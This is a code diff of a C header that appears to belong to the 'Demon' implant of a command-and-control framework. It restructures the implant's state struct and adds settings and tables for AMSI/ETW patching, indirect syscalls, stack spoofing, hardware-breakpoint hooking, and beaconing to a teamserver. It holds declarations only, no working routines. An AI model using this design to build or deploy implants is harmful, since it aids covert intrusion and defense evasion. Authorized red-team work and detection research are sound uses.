@@ -10,8 +10,9 @@
 #include <Common/Native.h>
 #include <Common/Macros.h>
 #include <Common/Clr.h>
+#include <Common/Defines.h>
 
-#include <Core/WinUtils.h>
+#include <Core/Win32.h>
 #include <Core/Token.h>
 #include <Core/Pivot.h>
 #include <Core/Spoof.h>
@@ -21,31 +22,27 @@
 #include <Core/Transport.h>
 #include <Core/Socket.h>
 #include <Core/Kerberos.h>
+#include <Core/Syscalls.h>
+#include <Core/SysNative.h>
+#include <Core/HwBpEngine.h>
 
 #include <Loader/CoffeeLdr.h>
-
-#define DEMON_MAGIC_VALUE 0xDEADBEEF
 
 #ifdef DEBUG
 #include <stdio.h>
 #endif
 
-#define WIN_VERSION_UNKNOWN 0
-#define WIN_VERSION_XP      1
-#define WIN_VERSION_VISTA   2
-#define WIN_VERSION_2008    3
-#define WIN_VERSION_7       4
-#define WIN_VERSION_2008_R2 5
-#define WIN_VERSION_2008_R2 6
-#define WIN_VERSION_2012    7
-#define WIN_VERSION_8       8
-#define WIN_VERSION_8_1     8.1
-#define WIN_VERSION_2012_R2 9
-#define WIN_VERSION_10      10
-#define WIN_VERSION_2016_X  11
-
-#define IMAGE_SIZE( IM ) \
-    ( ( ( PIMAGE_NT_HEADERS ) ( IM + ( ( PIMAGE_DOS_HEADER ) IM )->e_lfanew ) )->OptionalHeader.SizeOfImage )
+// To prevent false alignment on x64
+#pragma pack(1)
+typedef struct
+{
+    PVOID KaynLdr;
+    PVOID DllCopy;
+    PVOID Demon;
+    DWORD DemonSize;
+    PVOID TxtBase;
+    DWORD TxtSize;
+} KAYN_ARGS, *PKAYN_ARGS;
 
 // TODO: remove all variables that are not switched/changed after some time
 typedef struct
@@ -59,24 +56,30 @@ typedef struct
     /* wheather WSAStartup has been called yet */
     BOOL WSAWasInitialised;
 
+#ifdef TRANSPORT_HTTP
+    HANDLE hHttpSession;
+    BOOL   LookedForProxy;
+    PVOID  ProxyForUrl;
+    SIZE_T SizeOfProxyForUrl;
+#endif
+
+#if defined(SHELLCODE) && defined(DEBUG)
+    HANDLE hConsoleOutput;
+#endif
+
     struct {
-        UINT32  AgentID;
-        BOOL    Connected;
-
-        // Module Info
-        LPVOID  ModuleBase;
-
-        // Process Info
-        DWORD   PID;
-        DWORD   PPID;
-        WORD    ProcessArch;
-
-        // Computer Info
-        WORD    OS_Arch;
-
-        // Token Information
-        DWORD   Integrity; // TODO: get this info and send it back
-        DWORD   OSVersion;
+        PVOID ModuleBase;
+        DWORD ModuleSize;
+        PVOID TxtBase;
+        DWORD TxtSize;
+        DWORD AgentID;
+        BOOL  Connected;
+        DWORD PID;
+        DWORD TID;
+        DWORD PPID;
+        WORD  OS_Arch;
+        WORD  Process_Arch;
+        DWORD OSVersion;
     } Session;
 
     struct {
@@ -95,9 +98,9 @@ typedef struct
             DWORD      HostIndex;
             DWORD      HostMaxRetries;
             DWORD      Secure;
-            LPWSTR     UserAgent;
-            LPWSTR*    Uris;
-            LPWSTR*    Headers;
+            LPWSTR     UserAgent; /* TODO: change type to BUFFER */
+            LPWSTR*    Uris;      /* TODO: change type to BUFFER */
+            LPWSTR*    Headers;   /* TODO: change type to BUFFER */
 
             struct {
                 BOOL   Enabled;
@@ -108,67 +111,128 @@ typedef struct
 #endif
 
 #ifdef TRANSPORT_SMB
-            LPSTR   Name;
+            LPSTR   Name;   /* TODO: change type to BUFFER */
             HANDLE  Handle;
             UINT64  KillDate;
             UINT32  WorkingHours;
 #endif
-
         } Transport;
 
-        struct
-        {
-            DWORD   SleepMaskTechnique;
-            BOOL    Verbose;
-            PVOID   ThreadStartAddr;
-            BOOL    CoffeeThreaded;
-            BOOL    CoffeeVeh;
-            DWORD   DownloadChunkSize;
+        struct _CONFIG {
+            DWORD SleepMaskTechnique;
+            BOOL  StackSpoof;
+            BOOL  SysIndirect;
+            BYTE  ProxyLoading;
+            BYTE  AmsiEtwPatch;
+            BOOL  Verbose;
+            PVOID ThreadStartAddr;
+            BOOL  CoffeeThreaded;
+            BOOL  CoffeeVeh;
+            DWORD DownloadChunkSize;
         } Implant;
 
-        struct
-        {
-            UINT32  Alloc;
-            UINT32  Execute;
+        struct {
+            UINT32 Alloc;
+            UINT32 Execute;
         } Memory;
 
         // Process Config
         struct
         {
-            PWCHAR   Spawn64;
-            PWCHAR   Spawn86;
+            PWCHAR Spawn64; /* TODO: change type to BUFFER */
+            PWCHAR Spawn86; /* TODO: change type to BUFFER */
         } Process;
 
         struct
         {
-            DWORD   Technique;
-            PVOID   SpoofAddr;
+            DWORD Technique;
+            PVOID SpoofAddr;
         } Inject;
 
-        // Encryption / Decryption
-        struct
-        {
-            PBYTE   Key;
-            PBYTE   IV;
+        /* communication AES keys */
+        struct {
+            PBYTE Key;
+            PBYTE IV;
         } AES;
-
-        PVOID PowershellImport;
 
     } Config ;
 
     // TODO: format everything by library. inlcude syscalls too
     struct
     {
+        /* Ntdll.dll */
+        WIN_FUNC( LdrLoadDll )
+        WIN_FUNC( LdrGetProcedureAddress )
+
+        WIN_FUNC( RtlAllocateHeap )
+        WIN_FUNC( RtlReAllocateHeap )
+        WIN_FUNC( RtlFreeHeap )
+        WIN_FUNC( RtlRandomEx )
+        WIN_FUNC( RtlNtStatusToDosError )
+        WIN_FUNC( RtlGetVersion )
+        WIN_FUNC( RtlExitUserThread )
+        WIN_FUNC( RtlExitUserProcess )
+        WIN_FUNC( RtlCreateTimer )
+        WIN_FUNC( RtlRegisterWait )
+        WIN_FUNC( RtlQueueWorkItem )
+        WIN_FUNC( RtlCreateTimerQueue )
+        WIN_FUNC( RtlDeleteTimerQueue )
+        WIN_FUNC( RtlCaptureContext );
+        WIN_FUNC( RtlAddVectoredExceptionHandler );
+        WIN_FUNC( RtlRemoveVectoredExceptionHandler );
+        WIN_FUNC( RtlCopyMappedMemory );
+
+        WIN_FUNC( NtClose );
+        WIN_FUNC( NtSetEvent );
+        WIN_FUNC( NtSetInformationThread );
+        WIN_FUNC( NtSetInformationVirtualMemory );
+        WIN_FUNC( NtGetNextThread );
+        WIN_FUNC( NtOpenThread )
+        WIN_FUNC( NtOpenThreadToken )
+        WIN_FUNC( NtTerminateProcess )
+        WIN_FUNC( NtOpenProcess )
+        WIN_FUNC( NtOpenProcessToken )
+        WIN_FUNC( NtDuplicateToken )
+        WIN_FUNC( NtQueueApcThread )
+        WIN_FUNC( NtSuspendThread )
+        WIN_FUNC( NtResumeThread )
+        WIN_FUNC( NtCreateEvent )
+        WIN_FUNC( NtCreateThreadEx )
+        WIN_FUNC( NtDuplicateObject )
+        WIN_FUNC( NtGetContextThread )
+        WIN_FUNC( NtSetContextThread )
+        WIN_FUNC( NtQueryInformationProcess )
+        WIN_FUNC( NtQuerySystemInformation )
+        WIN_FUNC( NtWaitForSingleObject )
+        WIN_FUNC( NtTestAlert )
+        WIN_FUNC( NtAllocateVirtualMemory )
+        WIN_FUNC( NtWriteVirtualMemory )
+        WIN_FUNC( NtReadVirtualMemory )
+        WIN_FUNC( NtFreeVirtualMemory )
+        WIN_FUNC( NtUnmapViewOfSection )
+        WIN_FUNC( NtProtectVirtualMemory )
+        WIN_FUNC( NtTerminateThread )
+        WIN_FUNC( NtContinue )
+        WIN_FUNC( NtAlertResumeThread )
+        WIN_FUNC( NtSignalAndWaitForSingleObject )
+        WIN_FUNC( NtQueryVirtualMemory )
+        WIN_FUNC( NtQueryInformationToken )
+        WIN_FUNC( NtQueryInformationThread )
+        WIN_FUNC( NtQueryObject )
+        PVOID NtTraceEvent;
+
         // Kernel32
+        WIN_FUNC( LoadLibraryW )
         WIN_FUNC( CreateRemoteThread )
         WIN_FUNC( CreateToolhelp32Snapshot )
         WIN_FUNC( Process32FirstW )
         WIN_FUNC( Process32NextW )
-        WIN_FUNC( VirtualProtect )
         WIN_FUNC( VirtualAllocEx )
+        WIN_FUNC( VirtualProtect )
         WIN_FUNC( CreateFileW )
         WIN_FUNC( GetFullPathNameW )
         WIN_FUNC( GetFileSize )
+        WIN_FUNC( GetFileSizeEx )
         WIN_FUNC( CreateNamedPipeW )
         WIN_FUNC( WaitNamedPipeW )
         WIN_FUNC( PeekNamedPipe )
@@ -180,19 +244,14 @@ typedef struct
         WIN_FUNC( CreatePipe )
         WIN_FUNC( ReadFile )
         WIN_FUNC( GetComputerNameExA )
-        WIN_FUNC( LocalAlloc )
-        WIN_FUNC( LocalFree )
-        WIN_FUNC( LocalReAlloc )
-        WIN_FUNC( CreateProcessA )
+        WIN_FUNC( LocalAlloc )      /* TODO: replace with RtlAllocateHeap */
+        WIN_FUNC( LocalFree )       /* TODO: replace with RtlFreeHeap */
+        WIN_FUNC( LocalReAlloc )    /* TODO: replace with RtlReAllocateHeap */
         WIN_FUNC( CreateProcessW )
-        WIN_FUNC( ExitProcess )
         WIN_FUNC( GetExitCodeProcess )
         WIN_FUNC( GetExitCodeThread )
         WIN_FUNC( TerminateProcess )
-        WIN_FUNC( InitializeProcThreadAttributeList )
-        WIN_FUNC( UpdateProcThreadAttribute )
         WIN_FUNC( VirtualProtectEx )
-        WIN_FUNC( ReadProcessMemory )
         WIN_FUNC( GetCurrentDirectoryW )
         WIN_FUNC( FindFirstFileW )
         WIN_FUNC( FindNextFileW )
@@ -210,34 +269,14 @@ typedef struct
         WIN_FUNC( Wow64RevertWow64FsRedirection )
         WIN_FUNC( CopyFileW )
         WIN_FUNC( GetModuleHandleA )
-        WIN_FUNC( SetProcessValidCallTargets )
         WIN_FUNC( GetSystemTimeAsFileTime )
         WIN_FUNC( GetLocalTime )
         WIN_FUNC( DuplicateHandle )
+        WIN_FUNC( AttachConsole )
+        WIN_FUNC( WriteConsoleA )
+        HGLOBAL ( *GlobalFree ) ( HGLOBAL );
 
-        /* Ntdll.dll */
-        WIN_FUNC( LdrLoadDll )
-        WIN_FUNC( LdrGetProcedureAddress )
-        WIN_FUNC( RtlAllocateHeap )
-        WIN_FUNC( RtlReAllocateHeap )
-        WIN_FUNC( RtlFreeHeap )
-        WIN_FUNC( RtlRandomEx )
-        WIN_FUNC( RtlNtStatusToDosError )
-        WIN_FUNC( RtlGetVersion )
-        WIN_FUNC( RtlExitUserThread )
-        WIN_FUNC( RtlExitUserProcess )
-        WIN_FUNC( RtlCreateTimer )
-        NTSTATUS ( NTAPI* RtlCreateTimerQueue ) ( PHANDLE TimerQueueHandle );
-        WIN_FUNC( RtlDeleteTimerQueue )
-        WIN_FUNC( RtlCaptureContext );
-        WIN_FUNC( RtlAddVectoredExceptionHandler );
-        WIN_FUNC( RtlRemoveVectoredExceptionHandler );
-        WIN_FUNC( NtClose );
-        WIN_FUNC( NtSetEvent );
-        WIN_FUNC( NtCreateEvent );
-
-        // WinHTTP
-        // NOTE: maybe change to WinInet
+        /* WinHttp.dll */
         WIN_FUNC( WinHttpOpen )
         WIN_FUNC( WinHttpConnect )
         WIN_FUNC( WinHttpOpenRequest )
@@ -246,10 +285,10 @@ typedef struct
         WIN_FUNC( WinHttpSendRequest )
         WIN_FUNC( WinHttpAddRequestHeaders )
         WIN_FUNC( WinHttpReceiveResponse )
-        WIN_FUNC( WinHttpWebSocketCompleteUpgrade )
-        WIN_FUNC( WinHttpQueryDataAvailable )
         WIN_FUNC( WinHttpReadData )
         WIN_FUNC( WinHttpQueryHeaders )
+        WIN_FUNC( WinHttpGetIEProxyConfigForCurrentUser )
+        WIN_FUNC( WinHttpGetProxyForUrl )
 
         // Mscoree
         HRESULT ( WINAPI *CLRCreateInstance ) ( REFCLSID clsid, REFIID riid, LPVOID* ppInterface );
@@ -281,15 +320,8 @@ typedef struct
         WIN_FUNC( LsaNtStatusToWinError )
         WIN_FUNC( EqualSid )
         WIN_FUNC( ConvertSidToStringSidW )
-
-        // Thread Management
-        WIN_FUNC( OpenThread )
-        WIN_FUNC( Thread32First )
-        WIN_FUNC( Thread32Next )
-        WIN_FUNC( ResumeThread )
-
-        WIN_FUNC( GetThreadContext )
-        WIN_FUNC( SetThreadContext )
+        WIN_FUNC( GetSidSubAuthorityCount )
+        WIN_FUNC( GetSidSubAuthority)
 
         WIN_FUNC( ConvertThreadToFiberEx )
         WIN_FUNC( ConvertFiberToThread )
@@ -300,9 +332,8 @@ typedef struct
         // Token Management
         WIN_FUNC( RevertToSelf )
         WIN_FUNC( LookupAccountSidA )
+        WIN_FUNC( LookupAccountSidW )
         WIN_FUNC( LookupPrivilegeNameA )
-        WIN_FUNC( ImpersonateLoggedOnUser )
-        WIN_FUNC( LogonUserA )
         WIN_FUNC( LogonUserW )
         WIN_FUNC( AdjustTokenPrivileges )
         WIN_FUNC( OpenProcessToken )
@@ -312,6 +343,7 @@ typedef struct
 
         // String Formatting
         INT ( *vsnprintf ) ( PCHAR, SIZE_T, CONST PCHAR, va_list );
+        INT ( *swprintf_s ) ( PWCHAR, SIZE_T, CONST PWCHAR, ... );
 
         // * MISC *
         WIN_FUNC( CommandLineToArgvW )
@@ -322,7 +354,6 @@ typedef struct
         WIN_FUNC( ShowWindow )
         WIN_FUNC( GetStdHandle )
         WIN_FUNC( SetStdHandle )
-        WIN_FUNC( GetTickCount )
 
         WIN_FUNC( GetAdaptersInfo )
 
@@ -355,6 +386,7 @@ typedef struct
         WIN_FUNC( WSAStartup )
         WIN_FUNC( WSACleanup )
         WIN_FUNC( WSASocketA )
+        WIN_FUNC( WSAGetLastError )
         WIN_FUNC( ioctlsocket )
         WIN_FUNC( bind )
         WIN_FUNC( listen )
@@ -376,12 +408,19 @@ typedef struct
         WIN_FUNC( LsaConnectUntrusted )
         WIN_FUNC( LsaFreeReturnBuffer )
 
+        /* Amsi.dll */
+        PVOID AmsiScanBuffer;
+
     } Win32;
 
     struct
     {
+#undef OBF_SYSCALL
+#ifdef OBF_SYSCALL
         WIN_FUNC( NtOpenFile )
         WIN_FUNC( NtOpenThread )
+        WIN_FUNC( NtOpenThreadToken )
+        WIN_FUNC( NtTerminateProcess )
         WIN_FUNC( NtOpenProcess )
         WIN_FUNC( NtOpenProcessToken )
         WIN_FUNC( NtCreateSection )
@@ -403,8 +442,8 @@ typedef struct
         WIN_FUNC( NtWriteVirtualMemory )
         WIN_FUNC( NtReadVirtualMemory )
         WIN_FUNC( NtFreeVirtualMemory )
+        WIN_FUNC( NtUnmapViewOfSection )
         WIN_FUNC( NtProtectVirtualMemory )
-        WIN_FUNC( NtFlushInstructionCache )
         WIN_FUNC( NtTerminateThread )
         WIN_FUNC( NtContinue )
         WIN_FUNC( NtAlertResumeThread )
@@ -413,28 +452,67 @@ typedef struct
         WIN_FUNC( NtQueryInformationToken )
         WIN_FUNC( NtQueryInformationThread )
         WIN_FUNC( NtQueryObject )
-    } Syscall ;
+#else
+        PVOID  SysAddress; /* 'syscall' instruction pointer */
+        UINT32 Size; /* size of each 'syscall' stub */
+
+        /* Syscall Service Numbers */
+        WORD NtOpenThread;
+        WORD NtOpenThreadToken;
+        WORD NtTerminateProcess;
+        WORD NtOpenProcess;
+        WORD NtOpenProcessToken;
+        WORD NtDuplicateToken;
+        WORD NtQueueApcThread;
+        WORD NtSuspendThread;
+        WORD NtResumeThread;
+        WORD NtCreateEvent;
+        WORD NtCreateThreadEx;
+        WORD NtDuplicateObject;
+        WORD NtGetContextThread;
+        WORD NtSetContextThread;
+        WORD NtQueryInformationProcess;
+        WORD NtQuerySystemInformation;
+        WORD NtWaitForSingleObject;
+        WORD NtAllocateVirtualMemory;
+        WORD NtWriteVirtualMemory;
+        WORD NtReadVirtualMemory;
+        WORD NtFreeVirtualMemory;
+        WORD NtUnmapViewOfSection;
+        WORD NtProtectVirtualMemory;
+        WORD NtTerminateThread;
+        WORD NtAlertResumeThread;
+        WORD NtSignalAndWaitForSingleObject;
+        WORD NtQueryVirtualMemory;
+        WORD NtQueryInformationToken;
+        WORD NtQueryInformationThread;
+        WORD NtQueryObject;
+        WORD NtClose;
+        WORD NtSetEvent;
+        WORD NtSetInformationThread;
+        WORD NtSetInformationVirtualMemory;
+        WORD NtGetNextThread;
+#endif
+    } Syscall;
 
     struct
     {
+        PVOID Ntdll;
         PVOID Kernel32;
         PVOID Advapi32;
-        PVOID Crypt32;
-        PVOID CryptSp;
         PVOID Mscoree;
         PVOID Oleaut32;
-        PVOID Ntdll;
         PVOID User32;
         PVOID Shell32;
         PVOID Msvcrt;
-        PVOID KernelBase;
         PVOID Iphlpapi;
         PVOID Gdi32;
-        PVOID Wkscli;
         PVOID NetApi32;
         PVOID Ws2_32;
-        PVOID Dnsapi;
         PVOID Sspicli;
+
+        /* used for bypass */
+        PVOID Amsi;
 
 #ifdef TRANSPORT_HTTP
         PVOID WinHttp;
@@ -446,6 +524,9 @@ typedef struct
 
     /* Thread counter. how many threads that are using our code are running ? */
     DWORD  Threads;
+
+    /* A list of packages that have to be sent to the teamserver */
+    PPACKAGE Packages;
 
     /* Buffer to use for allocating download chunks. */
     BUFFER DownloadChunk;
@@ -467,14 +548,16 @@ typedef struct
     PDOWNLOAD_DATA       Downloads;
     PMEM_FILE            MemFiles;
     PSOCKET_DATA         Sockets;
+    PCOFFEE              Coffees;
+    PHWBP_ENGINE         HwBpEngine;
 
 } INSTANCE;
 
 extern INSTANCE Instance;
 
-VOID DemonMain( PVOID ModuleInst );
+VOID DemonMain( PVOID ModuleInst, PKAYN_ARGS KArgs );
 VOID DemonRoutine( );
-VOID DemonInit( VOID );
+VOID DemonInit( PVOID ModuleInst, PKAYN_ARGS KArgs );
 VOID DemonMetaData( PPACKAGE* Package, BOOL Header );
 VOID DemonConfig();
 
